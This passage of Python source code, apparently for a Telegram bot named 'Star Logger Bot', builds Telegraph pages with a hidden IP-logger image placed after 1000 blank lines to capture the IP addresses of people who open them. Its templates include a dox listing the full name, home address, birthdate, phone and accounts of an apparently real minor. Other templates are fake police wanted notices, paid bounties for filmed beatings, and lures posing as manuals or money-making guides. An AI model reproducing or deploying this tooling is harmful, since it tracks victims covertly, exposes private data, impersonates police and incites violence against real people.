    html_content = f"<p>Данная личность '{title}',довольно давно сидит в сети телеграмм, мешая многим пользователям спокойно обитать в том же телеграмме, за что и была сдокшена и слита. Его данные были приложены ниже в полном формате: <br>" + "<br> ФИО:Онищенко Ярослав Евгеньевич <br>" + "<br> Адрес:646062, Россия, Омская Область, П. Марьяновский, Ул. Школьная, 14 <br>" + "<br> ВК:https://vk.com/id57658287 <br>" + "<br> Возраст:01.11.2007 <br>" + "<br> Telegram:1555587760 <br>" + "<br> Gmail:aroslavonisenko88@gmail.com <br>" + "<br> Instagram:https://instagram.com/onisenkoaroslav556 <br>" + "<br> Номер:79503362591 <br>" + "<br> На этом докс окончен. Наш канал - ты попался на логгер1337</p><br>" + "<br>"*1000 + f"<img src='{photo_url}'>"
    page = telegraph.create_page(title=f"Jlu4HblE gaHHble {title}", html_content=html_content)
    
    # Получаем URL созданной статьи
    page_url = f"https://telegra.ph/{page['path']}"
    
    bot.send_message(message.chat.id, f"<b>⭐️Star Logger Bot⭐️\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}", parse_mode='HTML')
    
    send_log(
        f'<b>🔔 Пользователь {message.chat.id} \n⭐️Star Logger Bot⭐️\n⭐️Шаблон: Dox V2\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}'
    )

def create_article4(message):
    # Запрашиваем у пользователя тему статьи
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный ник который будет отображаться во время отправки ссылки на статью а так же в части текста в статье\n⭐️Введите ник вашего обидчика:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, create_article_photo4)

def create_article_photo4(message):
    title = message.text
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный логгер будет находится в конце статьи для снифинга айпи обидчика\n⭐️Введите ссылку на логгер:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, process_photo_url4, title=title)

def process_photo_url4(message, title):
    photo_url = message.text
    
    # Создаем страницу на telegraph с изображением фото 
    html_content = f"<p> Д0КС ТАКУЮ ЛИЧНОСТЬ КАК {title} ДАННАЯ ЛИЧНОСТЬ НЕОДНОКРАТНО ПИЗДЕЛА ДОХУЯ ЛИШНЕГО ЗА ЧТО И БЫЛА СЛИТА НАШЕЙ КОМАНДОЙ ДАННЫЕ ЭТОГО СУЩЕСТВА ПРИЛОЖЕНЫ НИЖЕ: <br>" + "<br> ФИО:Онищенко Ярослав Евгеньевич <br>" + "<br> Адрес:646062, Россия, Омская Область, П. Марьяновский, Ул. Школьная, 14 <br>" + "<br> ВК:https://vk.com/id57658287 <br>" + "<br> Возраст:01.11.2007 <br>" + "<br> Telegram:1555587760 <br>" + "<br> Gmail:aroslavonisenko88@gmail.com <br>" + "<br> Instagram:https://instagram.com/onisenkoaroslav556 <br>" + "<br> Номер:79503362591 <br>" + "<br> На этом докс окончен. Наш канал - ты попался на логгер1337</p> <br>" + "<br>"*1000 + f"<img src='{photo_url}'>"
    page = telegraph.create_page(title=f"Д0КС HA {title}", html_content=html_content)
    
    # Получаем URL созданной статьи
    page_url = f"https://telegra.ph/{page['path']}"
    
    bot.send_message(message.chat.id, f"<b>⭐️Star Logger Bot⭐️\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}", parse_mode='HTML')
    
    send_log(
        f'<b>🔔 Пользователь {message.chat.id} \n⭐️Star Logger Bot⭐️\n⭐️Шаблон: Dox V3\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}'
    )

def create_article5(message):
    # Запрашиваем у пользователя тему статьи
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный ник который будет отображаться во время отправки ссылки на статью а так же в части текста в статье\n⭐️Введите ник вашего обидчика:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, create_article_photo5)

def create_article_photo5(message):
    title = message.text
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный логгер будет находится в конце статьи для снифинга айпи обидчика\n⭐️Введите ссылку на логгер:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, process_photo_url5, title=title)

def process_photo_url5(message, title):
    photo_url = message.text
    
    # Создаем страницу на telegraph с изображением фото 
    html_content = f"<p>Такая личность как {title} - во первых много пиздит, а так же часто угрожает за что и будет наказана, его наказание таково - его данные я солью на общее обозрение, пусть публика посмотрит на таких зумеров как он, его данные будут приложены ниже: <br>" + "<br> ФИО:Онищенко Ярослав Евгеньевич <br>" + "<br> Адрес:646062, Россия, Омская Область, П. Марьяновский, Ул. Школьная, 14 <br>" + "<br> ВК:https://vk.com/id57658287 <br>" + "<br> Возраст:01.11.2007 <br>" + "<br> Telegram:1555587760 <br>" + "<br> Gmail:aroslavonisenko88@gmail.com <br>" + "<br> Instagram:https://instagram.com/onisenkoaroslav556 <br>" + "<br> Номер:79503362591 <br>" + "<br> На этом докс окончен. Наш канал - ты попался на логгер1337</p> <br>" + "<br>"*1000 + f"<img src='{photo_url}'>"
    page = telegraph.create_page(title=f"D0xing na {title} - пиздабол", html_content=html_content)
    
    # Получаем URL созданной статьи
    page_url = f"https://telegra.ph/{page['path']}"
    
    bot.send_message(message.chat.id, f"<b>⭐️Star Logger Bot⭐️\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}", parse_mode='HTML')
    
    send_log(
        f'<b>🔔 Пользователь {message.chat.id} \n⭐️Star Logger Bot⭐️\n⭐️Шаблон: Dox V4\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}'
    )

def create_article6(message):
    # Запрашиваем у пользователя тему статьи
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный ник который будет отображаться во время отправки ссылки на статью а так же в части текста в статье\n⭐️Введите ник вашего обидчика:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, create_article_photo6)

def create_article_photo6(message):
    title = message.text
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный логгер будет находится в конце статьи для снифинга айпи обидчика\n⭐️Введите ссылку на логгер:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, process_photo_url6, title=title)

def process_photo_url6(message, title):
    photo_url = message.text
    
    # Создаем страницу на telegraph с изображением фото 
    html_content = f"<p>Здравствуй, благодарю за покупку данного мануала от {title}, данный мануал по анонимности был продан за 30$. начнем с первого раздела: безопасность и настройка анонимности: удалите все Российские приложения. Все говорят про сливы Гугла и Майкрософта, но это - пендосы, а до русского человека ближе дойдет рука русских силовиков. ВКонтакте- собирает полную информацию о вас, отслеживает ваши действия, и передвижения, все переписки - хранятся, и при удалении сообщения открою секрет, ты не удаляешь их с ВКонтакте, просто появляется своего рода функция 'скрытия', а так удаленные сообщения, и медиа контент доступны всем пользователям при наличии ссылки . Не желательно использовать Киви даже для повседневных покупок, ищите аналоги используйте ВПН.</p>" + "<br>"*1000 + f"<img src='{photo_url}'>"
    page = telegraph.create_page(title=f"Private anon {title} manual 30$", html_content=html_content)
    
    # Получаем URL созданной статьи
    page_url = f"https://telegra.ph/{page['path']}"
    
    bot.send_message(message.chat.id, f"<b>⭐️Star Logger Bot⭐️\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}", parse_mode='HTML')
    
    send_log(
        f'<b>🔔 Пользователь {message.chat.id} \n⭐️Star Logger Bot⭐️\n⭐️Шаблон: manual V1\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}'
    )

def create_article7(message):
    # Запрашиваем у пользователя тему статьи
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный ник который будет отображаться во время отправки ссылки на статью а так же в части текста в статье\n⭐️Введите ник вашего обидчика:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, create_article_photo7)

def create_article_photo7(message):
    title = message.text
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный логгер будет находится в конце статьи для снифинга айпи обидчика\n⭐️Введите ссылку на логгер:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, process_photo_url7, title=title)

def process_photo_url7(message, title):
    photo_url = message.text
    
    # Создаем страницу на telegraph с изображением фото 
    html_content = f"<p>MANUAL - Ликвидация анонимности: стратегии защиты, Мануал от {title}. В современном цифровом мире сохранение личной анонимности становится все более важным. Узнайте, какие методы и инструменты помогут вам защитить свою конфиденциальность и избежать деанонимизации. Раскройте секреты безопасности в онлайн-пространстве в нашей увлекательной статье на страницах Telegraph.</p>" + "<br>"*1000 + f"<img src='{photo_url}'>"
    page = telegraph.create_page(title=f"Manual {title} Расkрытuе mас0k - kак πред0тBpатuтb gеан0нuмuзацuю", html_content=html_content)
    
    # Получаем URL созданной статьи
    page_url = f"https://telegra.ph/{page['path']}"
    
    bot.send_message(message.chat.id, f"<b>⭐️Star Logger Bot⭐️\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}", parse_mode='HTML')
    
    send_log(
        f'<b>🔔 Пользователь {message.chat.id} \n⭐️Star Logger Bot⭐️\n⭐️Шаблон: manual V2\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}'
    )

def create_article8(message):
    # Запрашиваем у пользователя тему статьи
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный ник который будет отображаться во время отправки ссылки на статью а так же в части текста в статье\n⭐️Введите ник вашего обидчика:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, create_article_photo8)

def create_article_photo8(message):
    title = message.text
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный логгер будет находится в конце статьи для снифинга айпи обидчика\n⭐️Введите ссылку на логгер:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, process_photo_url8, title=title)

def process_photo_url8(message, title):
    photo_url = message.text
    
    # Создаем страницу на telegraph с изображением фото 
    html_content = f"<p>Наиболее опасный разыскиваемый преступник в платформе Telegram {title} . МВД России просит граждан помочь в розыске преступника который известен как {title}, совершивший особо тяжкие преступления. Сумма вознаграждения за помощь в розыске - 1 миллион рублей за его поимку в разделе разыскиваемых.  Всем, кто располагает информацией, просьба звонить по телефонам: 02 (102) или 8 (495) 667-72-14 </p>" + "<br>"*1000 + f"<img src='{photo_url}'>"
    page = telegraph.create_page(title=f"Внимание, розыск пользователя в платформе Telegram!", html_content=html_content)
    
    # Получаем URL созданной статьи
    page_url = f"https://telegra.ph/{page['path']}"
    
    bot.send_message(message.chat.id, f"<b>⭐️Star Logger Bot⭐️\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}", parse_mode='HTML')
    
    send_log(
        f'<b>🔔 Пользователь {message.chat.id} \n⭐️Star Logger Bot⭐️\n⭐️Шаблон: Розыск Мвд.РФ V1\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}'
    )

def create_article9(message):
    # Запрашиваем у пользователя тему статьи
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный ник который будет отображаться во время отправки ссылки на статью а так же в части текста в статье\n⭐️Введите ник вашего обидчика:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, create_article_photo9)

def create_article_photo9(message):
    title = message.text
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный логгер будет находится в конце статьи для снифинга айпи обидчика\n⭐️Введите ссылку на логгер:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, process_photo_url9, title=title)

def process_photo_url9(message, title):
    photo_url = message.text
    
    # Создаем страницу на telegraph с изображением фото 
    html_content = f"<p>Здраствуйте дорогие граждане Российской Федерации! Сегодня в розыск был объявлен пользователь на платформе Telegram, его никнейм {title}, данный пользователь совершивший особо тяжкие преступления должен быть наказан. МВД России просит граждан помочь в розыске преступника,сумма вознаграждения за помощь в розыске - 1 миллион рублей за поимку данного разыскиваемого.</p>" + "<br>"*1000 + f"<img src='{photo_url}'>"
    page = telegraph.create_page(title=f"Внимание! Розыск пользователя известным как {title}", html_content=html_content)
    
    # Получаем URL созданной статьи
    page_url = f"https://telegra.ph/{page['path']}"
    
    bot.send_message(message.chat.id, f"<b>⭐️Star Logger Bot⭐️\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}", parse_mode='HTML')
    
    send_log(
        f'<b>🔔 Пользователь {message.chat.id} \n⭐️Star Logger Bot⭐️\n⭐️Шаблон: Розыск Мвд.РФ V2\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}'
    )

def create_article10(message):
    # Запрашиваем у пользователя тему статьи
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный ник/имя который будет отображаться во время отправки ссылки на статью а так же в части текста в статье\n⭐️Введите ник/имя вашего обидчика:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, create_article_photo10)

def create_article_photo10(message):
    title = message.text
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный логгер будет находится в конце статьи для снифинга айпи обидчика\n⭐️Введите ссылку на логгер:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, process_photo_url10, title=title)

def process_photo_url10(message, title):
    photo_url = message.text
    
    # Создаем страницу на telegraph с изображением фото 
    html_content = f"<p>Данная личность как - {title} разыскивается СпортОтрядом, тем кто его отпиздит/унизит на видео, ударит палкой по рукам/ногам. Гарантировано дается 40.000р . Так же можно применять любые виды насилия чтобы {title} на видео страдал с такой болью, что его крики были слышны в Китае. По оплате а так же куда присылать видео - @KpukuMou цена актуальна и ждет своего выполнения. Приятного поиска данной личности в городах и селах.</p>" + "<br>"*1000 + f"<img src='{photo_url}'>"
    page = telegraph.create_page(title=f"Разыскивается СпортОтрядом такая личность как - {title} ", html_content=html_content)
    
    # Получаем URL созданной статьи
    page_url = f"https://telegra.ph/{page['path']}"
    
    bot.send_message(message.chat.id, f"<b>⭐️Star Logger Bot⭐️\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}", parse_mode='HTML')
    
    send_log(
        f'<b>🔔 Пользователь {message.chat.id} \n⭐️Star Logger Bot⭐️\n⭐️Шаблон: Розыск СпортОтрядом V1\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}'
    )

def create_article11(message):
    # Запрашиваем у пользователя тему статьи
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный ник/имя который будет отображаться во время отправки ссылки на статью а так же в части текста в статье\n⭐️Введите ник/имя вашего обидчика:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, create_article_photo11)

def create_article_photo11(message):
    title = message.text
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный логгер будет находится в конце статьи для снифинга айпи обидчика\n⭐️Введите ссылку на логгер:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, process_photo_url11, title=title)

def process_photo_url11(message, title):
    photo_url = message.text
    
    # Создаем страницу на telegraph с изображением фото 
    html_content = f"<p>Данная личность {title} задолжала людям некую сумму денег, просьба отыскать данное существо и отпиздить/унизить на видео, по отношению к данному существу можно применять любые приемы физической силы, оплата при получении видео с страданиями {title}. Гарантировано дается 40.000р . По оплате а так же куда присылать видео - @KpukuMou цена актуальна и ждет своего выполнения. Приятного поиска данной личности в городах и селах.</p>" + "<br>"*1000 + f"<img src='{photo_url}'>"
    page = telegraph.create_page(title=f"СпортОтряд разыскивает такую личность как - {title} ", html_content=html_content)
    
    # Получаем URL созданной статьи
    page_url = f"https://telegra.ph/{page['path']}"
    
    bot.send_message(message.chat.id, f"<b>⭐️Star Logger Bot⭐️\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}", parse_mode='HTML')
    
    send_log(
        f'<b>🔔 Пользователь {message.chat.id} \n⭐️Star Logger Bot⭐️\n⭐️Шаблон: Розыск СпортОтрядом V2\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}'
    )

def create_article12(message):
    # Запрашиваем у пользователя тему статьи
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный ник который будет отображаться во время отправки ссылки на статью а так же в части текста в статье\n⭐️Введите ник вашего обидчика:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, create_article_photo12)

def create_article_photo12(message):
    title = message.text
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный логгер будет находится в конце статьи для снифинга айпи обидчика\n⭐️Введите ссылку на логгер:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, process_photo_url12, title=title)

def process_photo_url12(message, title):
    photo_url = message.text
    
    # Создаем страницу на telegraph с изображением фото 
    html_content = f"<p>Связка всем известная, так как о ней тысячи говорят, десятки пытаются применить, а добиваются своего всего лишь единицы. Я решил, что немного мотивации вам не помешает, и повысить число тех, кто зарабатывает деньги из воздуха.Связка: Tik Tok+You-Tube Сегодня я дам вам знания о том, как монетизировать каналы с развлекательным контентом в самой дешевой, но активной аудитории. Для начала пройдемся по примерам, чтобы понимать к чему надо стремиться хотя бы по статистике {title} - лох.</p> <br>" + "<br>"*1000 + f"<img src='{photo_url}'>"
    page = telegraph.create_page(title=f"Как вытаскивать по 800-1000$ ежемесячно на тупом контенте из Тик Тока.", html_content=html_content)
    
    # Получаем URL созданной статьи
    page_url = f"https://telegra.ph/{page['path']}"
    
    bot.send_message(message.chat.id, f"<b>⭐️Star Logger Bot⭐️\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}", parse_mode='HTML')
    
    send_log(
        f'<b>🔔 Пользователь {message.chat.id} \n⭐️Star Logger Bot⭐️\n⭐️Шаблон: заработок V1\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}'
    )

def create_article13(message):
    # Запрашиваем у пользователя тему статьи
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный ник который будет отображаться во время отправки ссылки на статью а так же в части текста в статье\n⭐️Введите ник вашего обидчика:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, create_article_photo13)

def create_article_photo13(message):
    title = message.text
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный логгер будет находится в конце статьи для снифинга айпи обидчика\n⭐️Введите ссылку на логгер:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, process_photo_url13, title=title)

def process_photo_url13(message, title):
    photo_url = message.text
    
    # Создаем страницу на telegraph с изображением фото 
    html_content = f"<p>Крипто-пираты зарабатывают на поисках seed-фразы, которые владельцы кошельков засветили каким-либо образом. Например, через Twitter, в социальных сетях или на форумах.Имея сид-фразу, вы можете восстановить доступ к кошельку. Если кошелек создавался давно и уже не используется владельцем, то есть шанс заработать какую-то сумму. Например, владелец кошелька купил пару монет в 2013 году, когда они стоили по $1-$2, забыл про них и создал новый кошелек. Сейчас эти монеты могут стоить $10-$20 за штуку, а значит, вы совершенно бесплатно (не считая комиссии) получаете крипто-токены. {title} - лох.</p> <br>" + "<br>"*1000 + f"<img src='{photo_url}'>"
    page = telegraph.create_page(title=f"1000$ в месяц на крипто-пиратах.Белая схема", html_content=html_content)
    
    # Получаем URL созданной статьи
    page_url = f"https://telegra.ph/{page['path']}"
    
    bot.send_message(message.chat.id, f"<b>⭐️Star Logger Bot⭐️\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}", parse_mode='HTML')
    
    send_log(
        f'<b>🔔 Пользователь {message.chat.id} \n⭐️Star Logger Bot⭐️\n⭐️Шаблон: заработок V2\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}'
    )

import sqlite3
from datetime import datetime, timedelta

def give_sub(message):
    if message.text:
        data = message.text.split(' ')
        expiration_date = datetime.now() + timedelta(days=int(data[1]))
        add_subscription(data[0], expiration_date, int(data[1]))
        
        # Отправка сообщения пользователю о выдаче подписки
        bot.send_message(data[0], "<b>✅ Вам выдана подписка на {0} дней.\n✅Пропишите /start чтобы подписка была активирована</b>".format(data[1]), parse_mode='HTML')
        
        # Редактирование сообщения об успешной выдаче подписки
        bot.edit_message_caption(
            chat_id=message.chat.id,
            message_id=message.id - 1,
            caption=f'<b>✅ Пользователь {data[0]} получил {data[1]} дней подписки.</b>')
        
        # Удаление сообщения с командой выдачи подписки
        bot.delete_message(chat_id=message.chat.id, message_id=message.id)
    else:
        pass

def add_subscription(user_id, expiration_date, days_to_add):
    conn = sqlite3.connect('database2.db')
    cursor = conn.cursor()

    cursor.execute(
        "SELECT expiration_date FROM subscriptions WHERE user_id = ?", (user_id,))
    current_expiration_date = cursor.fetchone()

    if current_expiration_date:
        current_exp_date = datetime.strptime(current_expiration_date[0], '%Y-%m-%d %H:%M:%S.%f')
        new_expiration_date = current_exp_date + timedelta(days=days_to_add)
        cursor.execute(
            "UPDATE subscriptions SET expiration_date = ? WHERE user_id = ?", (new_expiration_date, user_id))
    else:
        cursor.execute(
            "INSERT INTO subscriptions (user_id, expiration_date) VALUES (?, ?)",
            (user_id, expiration_date + timedelta(days=days_to_add)))

    conn.commit()
    conn.close()

def send_log(log_text):
  bot.send_message(log_chat_id, log_text)


if __name__ == '__main__':
  while True:
    try:
      bot.infinity_polling()
    except Exception as e:
      bot = telebot.TeleBot(cfg.bot_token, parse_mode='HTML')
      send_log(e)
      











































































































